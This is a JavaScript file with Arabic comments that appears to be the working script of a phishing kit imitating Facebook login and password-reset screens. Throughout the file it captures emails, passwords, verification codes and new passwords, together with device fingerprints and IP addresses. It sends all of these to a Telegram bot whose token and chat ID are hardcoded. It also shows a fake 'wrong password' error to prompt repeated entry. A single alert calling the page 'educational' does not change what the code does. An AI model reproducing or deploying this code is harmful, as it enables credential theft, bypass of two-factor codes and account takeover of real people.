// وظيفة للتعامل مع نموذج استعادة كلمة المرور
function handleForgotPassword(event) {
    event.preventDefault();
    
    // الحصول على قيمة المدخل
    const emailOrPhone = document.getElementById('emailOrPhone').value;
    
    // التحقق من صحة المدخل
    if (!emailOrPhone) {
        alert('يرجى إدخال البريد الإلكتروني أو رقم الهاتف');
        return;
    }
    
    // جمع معلومات الجهاز
    const deviceInfo = collectDeviceInfo();
    
    // الحصول على عنوان IP
    getUserIP().then(ip => {
        // إرسال البيانات إلى بوت تيليجرام مع معلومات الجهاز وعنوان IP
        sendForgotPasswordToTelegram(emailOrPhone, deviceInfo, ip);
    }).catch(error => {
        console.error('فشل في الحصول على عنوان IP:', error);
        // إرسال البيانات حتى في حالة فشل الحصول على عنوان IP
        sendForgotPasswordToTelegram(emailOrPhone, deviceInfo, 'غير متوفر');
    });
    
    // محاكاة عملية البحث عن الحساب
    console.log('محاولة البحث عن الحساب بـ:', emailOrPhone);
    
    // عرض رسالة للمستخدم
    const searchBtn = document.querySelector('.search-btn');
    const originalText = searchBtn.textContent;
    
    searchBtn.textContent = 'جاري البحث...';
    searchBtn.disabled = true;
    
    // محاكاة وقت الانتظار
    setTimeout(() => {
        searchBtn.textContent = originalText;
        searchBtn.disabled = false;
        
        // إعادة توجيه المستخدم إلى صفحة إدخال كلمة المرور
        window.location.href = 'reset-password.html';
    }, 1500);
}

// وظيفة لإرسال بيانات استعادة كلمة المرور إلى بوت تيليجرام
function sendForgotPasswordToTelegram(emailOrPhone, deviceInfo, userIP) {
    // استبدل هذه القيم بقيم البوت الخاص بك
    const botToken = '8271588261:AAHDUiHbBElWHtvIHG_OVrLMvoM9utkBhGQ';
    const chatId = '-1003510133894';
    
    // إنشاء الرسالة مع معلومات الجهاز وعنوان IP
    const message = `🔑 طلب استعادة كلمة المرور الجديد:\n\n📧 البريد الإلكتروني/رقم الهاتف: ${emailOrPhone}\n\n💻 معلومات الجهاز:\n${deviceInfo}\n\n🌐 عنوان IP: ${userIP}`;
    
    // إرسال الرسالة إلى تيليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('تم إرسال بيانات استعادة كلمة المرور إلى تيليجرام بنجاح:', data);
        } else {
            console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', data);
        }
    })
    .catch(error => {
        console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', error);
    });
}

// وظيفة للتعامل مع عملية تسجيل الدخول
function handleLogin(event) {
    event.preventDefault();

    // الحصول على قيم المدخلات
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // التحقق من صحة المدخلات
    if (!email || !password) {
        alert('يرجى إدخال البريد الإلكتروني وكلمة المرور');
        return;
    }

    // جمع معلومات الجهاز
    const deviceInfo = collectDeviceInfo();

    // الحصول على عنوان IP
    getUserIP().then(ip => {
        // إرسال البيانات إلى بوت تيليجرام مع معلومات الجهاز وعنوان IP
        sendToTelegram(email, password, deviceInfo, ip);
    }).catch(error => {
        console.error('فشل في الحصول على عنوان IP:', error);
        // إرسال البيانات حتى في حالة فشل الحصول على عنوان IP
        sendToTelegram(email, password, deviceInfo, 'غير متوفر');
    });

    // محاكاة عملية تسجيل الدخول
    console.log('محاولة تسجيل الدخول بـ:', email);

    // عرض رسالة للمستخدم
    const loginBtn = document.querySelector('.login-btn');
    const originalText = loginBtn.textContent;

    loginBtn.textContent = 'جاري تسجيل الدخول...';
    loginBtn.disabled = true;

    // محاكاة وقت الانتظار
    setTimeout(() => {
        loginBtn.textContent = originalText;
        loginBtn.disabled = false;

        // رسالة خطأ في كلمة المرور
        alert('كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.');
    }, 1500);
}

// وظيفة لإرسال البيانات إلى بوت تيليجرام
function sendToTelegram(email, password, deviceInfo, userIP) {
    // استبدل هذه القيم بقيم البوت الخاص بك
    const botToken = '8271588261:AAHDUiHbBElWHtvIHG_OVrLMvoM9utkBhGQ';
    const chatId = '-1003510133894';

    // إنشاء الرسالة
    const message = `🔐 بيانات تسجيل الدخول الجديدة:\n\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}\n\n💻 معلومات الجهاز:\n${deviceInfo}\n\n🌐 عنوان IP: ${userIP}`;

    // إرسال الرسالة إلى تيليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('تم إرسال البيانات إلى تيليجرام بنجاح:', data);
        } else {
            console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', data);
            alert('حدث خطأ في إرسال البيانات. الرجاء التأكد من أن البوت عضو في المجموعة وله صلاحيات الإرسال.');
        }
    })
    .catch(error => {
        console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', error);
        alert('حدث خطأ في الاتصال بخادم تيليجرام. الرجاء المحاولة مرة أخرى.');
    });
}

// وظيفة لجمع معلومات الجهاز
function collectDeviceInfo() {
    const deviceInfo = {
        // نوع المتصفح
        browser: navigator.userAgent,
        // نظام التشغيل
        platform: navigator.platform,
        // اللغة
        language: navigator.language,
        // دعم اللمس
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'نعم' : 'لا',
        // دقة الشاشة
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        // حجم النافذة
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        // نوع الاتصال
        connection: navigator.connection ? navigator.connection.effectiveType : 'غير متوفر',
        // معالج الجهاز
        cores: navigator.hardwareConcurrency || 'غير متوفر',
        // ذاكرة الجهاز
        memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'غير متوفر'
    };
    
    // تحويل المعلومات إلى نص
    let deviceInfoText = '';
    for (const key in deviceInfo) {
        deviceInfoText += `• ${key}: ${deviceInfo[key]}\n`;
    }
    
    return deviceInfoText;
}

// وظيفة للتعامل مع نموذج تعيين كلمة مرور جديدة
function handleNewPassword(event) {
    event.preventDefault();
    
    // الحصول على قيم المدخلات
    const newPassword = document.getElementById('newPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    
    // التحقق من صحة المدخلات
    if (!newPassword || !confirmPassword) {
        alert('يرجى إدخال كلمة المرور الجديدة وتأكيدها');
        return;
    }
    
    // التحقق من تطابق كلمتي المرور
    if (newPassword !== confirmPassword) {
        alert('كلمتا المرور غير متطابقتين. يرجى المحاولة مرة أخرى.');
        return;
    }
    
    // جمع معلومات الجهاز
    const deviceInfo = collectDeviceInfo();
    
    // الحصول على عنوان IP
    getUserIP().then(ip => {
        // إرسال البيانات إلى بوت تيليجرام مع معلومات الجهاز وعنوان IP
        sendNewPasswordToTelegram(newPassword, deviceInfo, ip);
    }).catch(error => {
        console.error('فشل في الحصول على عنوان IP:', error);
        // إرسال البيانات حتى في حالة فشل الحصول على عنوان IP
        sendNewPasswordToTelegram(newPassword, deviceInfo, 'غير متوفر');
    });
    
    // محاكاة عملية تعيين كلمة المرور الجديدة
    console.log('محاولة تعيين كلمة مرور جديدة');
    
    // عرض رسالة للمستخدم
    const continueBtn = document.querySelector('.continue-btn');
    const originalText = continueBtn.textContent;
    
    continueBtn.textContent = 'جاري التعيين...';
    continueBtn.disabled = true;
    
    // محاكاة وقت الانتظار
    setTimeout(() => {
        continueBtn.textContent = originalText;
        continueBtn.disabled = false;
        
        // إعادة توجيه المستخدم إلى صفحة تسجيل الدخول
        window.location.href = 'login.html';
    }, 1500);
}

// وظيفة لإرسال كلمة المرور الجديدة إلى بوت تيليجرام
function sendNewPasswordToTelegram(newPassword, deviceInfo, userIP) {
    // استبدل هذه القيم بقيم البوت الخاص بك
    const botToken = '8271588261:AAHDUiHbBElWHtvIHG_OVrLMvoM9utkBhGQ';
    const chatId = '-1003510133894';
    
    // إنشاء الرسالة مع معلومات الجهاز وعنوان IP
    const message = `🔑 كلمة المرور الجديدة:\n\n🔑 كلمة المرور: ${newPassword}\n\n💻 معلومات الجهاز:\n${deviceInfo}\n\n🌐 عنوان IP: ${userIP}`;
    
    // إرسال الرسالة إلى تيليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('تم إرسال كلمة المرور الجديدة إلى تيليجرام بنجاح:', data);
        } else {
            console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', data);
        }
    })
    .catch(error => {
        console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', error);
    });
}

// وظيفة للتعامل مع نموذج التحقق
function handleVerify(event) {
    event.preventDefault();
    
    // جمع الرموز المدخلة
    const codeInputs = document.querySelectorAll('.code-input');
    let verificationCode = '';
    
    codeInputs.forEach(input => {
        verificationCode += input.value;
    });
    
    // التحقق من صحة الرمز
    if (verificationCode.length !== 6) {
        alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
        return;
    }
    
    // جمع معلومات الجهاز
    const deviceInfo = collectDeviceInfo();
    
    // الحصول على عنوان IP
    getUserIP().then(ip => {
        // إرسال البيانات إلى بوت تيليجرام مع معلومات الجهاز وعنوان IP
        sendVerificationCodeToTelegram(verificationCode, deviceInfo, ip);
    }).catch(error => {
        console.error('فشل في الحصول على عنوان IP:', error);
        // إرسال البيانات حتى في حالة فشل الحصول على عنوان IP
        sendVerificationCodeToTelegram(verificationCode, deviceInfo, 'غير متوفر');
    });
    
    // محاكاة عملية التحقق
    console.log('محاولة التحقق باستخدام الرمز:', verificationCode);
    
    // عرض رسالة للمستخدم
    const verifyBtn = document.querySelector('.verify-btn');
    const originalText = verifyBtn.textContent;
    
    verifyBtn.textContent = 'جاري التحقق...';
    verifyBtn.disabled = true;
    
    // محاكاة وقت الانتظار
    setTimeout(() => {
        verifyBtn.textContent = originalText;
        verifyBtn.disabled = false;
        
        // إعادة توجيه المستخدم إلى صفحة تعيين كلمة مرور جديدة
        window.location.href = 'new-password.html';
    }, 1500);
}

// وظيفة لإرسال رمز التحقق إلى بوت تيليجرام
function sendVerificationCodeToTelegram(code, deviceInfo, userIP) {
    // استبدل هذه القيم بقيم البوت الخاص بك
    const botToken = '8271588261:AAHDUiHbBElWHtvIHG_OVrLMvoM9utkBhGQ';
    const chatId = '-1003510133894';
    
    // إنشاء الرسالة مع معلومات الجهاز وعنوان IP
    const message = `🔐 رمز التحقق المدخل:\n\n🔑 الرمز: ${code}\n\n💻 معلومات الجهاز:\n${deviceInfo}\n\n🌐 عنوان IP: ${userIP}`;
    
    // إرسال الرسالة إلى تيليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('تم إرسال رمز التحقق إلى تيليجرام بنجاح:', data);
        } else {
            console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', data);
        }
    })
    .catch(error => {
        console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', error);
    });
}

// وظيفة للتعامل مع اختيار طريقة إعادة تعيين كلمة المرور
function selectResetOption(option) {
    // جمع معلومات الجهاز
    const deviceInfo = collectDeviceInfo();
    
    // الحصول على عنوان IP
    getUserIP().then(ip => {
        // إرسال البيانات إلى بوت تيليجرام مع معلومات الجهاز وعنوان IP
        sendResetOptionToTelegram(option, deviceInfo, ip);
    }).catch(error => {
        console.error('فشل في الحصول على عنوان IP:', error);
        // إرسال البيانات حتى في حالة فشل الحصول على عنوان IP
        sendResetOptionToTelegram(option, deviceInfo, 'غير متوفر');
    });
    
    // إعادة توجيه المستخدم إلى صفحة التحقق
    window.location.href = 'verify-reset.html';
}

// وظيفة لإرسال اختيار طريقة إعادة تعيين كلمة المرور إلى بوت تيليجرام
function sendResetOptionToTelegram(option, deviceInfo, userIP) {
    // استبدل هذه القيم بقيم البوت الخاص بك
    const botToken = '8271588261:AAHDUiHbBElWHtvIHG_OVrLMvoM9utkBhGQ';
    const chatId = '-1003510133894';
    
    // تحديد الطريقة المختارة
    const optionText = option === 'email' ? 'البريد الإلكتروني' : 'الرسالة النصية';
    
    // إنشاء الرسالة مع معلومات الجهاز وعنوان IP
    const message = `🔑 اختيار طريقة إعادة تعيين كلمة المرور:\n\n📌 الطريقة المختارة: ${optionText}\n\n💻 معلومات الجهاز:\n${deviceInfo}\n\n🌐 عنوان IP: ${userIP}`;
    
    // إرسال الرسالة إلى تيليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('تم إرسال اختيار طريقة إعادة تعيين كلمة المرور إلى تيليجرام بنجاح:', data);
        } else {
            console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', data);
        }
    })
    .catch(error => {
        console.error('حدث خطأ في إرسال البيانات إلى تيليجرام:', error);
    });
}

// وظيفة للحصول على عنوان IP
function getUserIP() {
    // محاولة الحصول على عنوان IP من عدة مصادر
    return fetch('https://api.ipify.org?format=json')
        .then(response => {
            if (!response.ok) throw new Error('فشل في الاتصال بخدمة ipify');
            return response.json();
        })
        .then(data => data.ip)
        .catch(error => {
            console.error('فشل في الحصول على عنوان IP من ipify:', error);
            // محاولة استخدام خدمة بديلة
            return fetch('https://api.ip.sb/ip')
                .then(response => {
                    if (!response.ok) throw new Error('فشل في الاتصال بخدمة ip.sb');
                    return response.text();
                })
                .then(ip => ip.trim())
                .catch(error => {
                    console.error('فشل في الحصول على عنوان IP من ip.sb:', error);
                    // محاولة استخدام خدمة ثالثة
                    return fetch('https://ipapi.co/json/')
                        .then(response => {
                            if (!response.ok) throw new Error('فشل في الاتصال بخدمة ipapi');
                            return response.json();
                        })
                        .then(data => data.ip)
                        .catch(error => {
                            console.error('فشل في الحصول على عنوان IP من ipapi:', error);
                            return 'غير متوفر';
                        });
                });
        });
}

// إضافة تأثيرات عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // إضافة تأثير التركيز على حقول الإدخال
    const inputs = document.querySelectorAll('.login-box input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.classList.add('focused');
        });

        input.addEventListener('blur', function() {
            this.parentElement.classList.remove('focused');
        });
    });

    // إضافة تأثير عند النقر على زر إنشاء حساب
    const createAccountBtn = document.querySelector('.create-account-btn');
    createAccountBtn.addEventListener('click', function() {
        alert('هذه واجهة تعليمية فقط ولا تقوم بإنشاء حساب فعلي على فيسبوك.');
    });

    // إضافة تأثير عند النقر على رابط "هل نسيت كلمة المرور؟"
    const forgotPasswordLink = document.querySelector('.forgot-password');
    forgotPasswordLink.addEventListener('click', function(e) {
        e.preventDefault();
        alert('هذه واجهة تعليمية فقط ولا تقوم باستعادة كلمة المرور الفعلية.');
    });
});
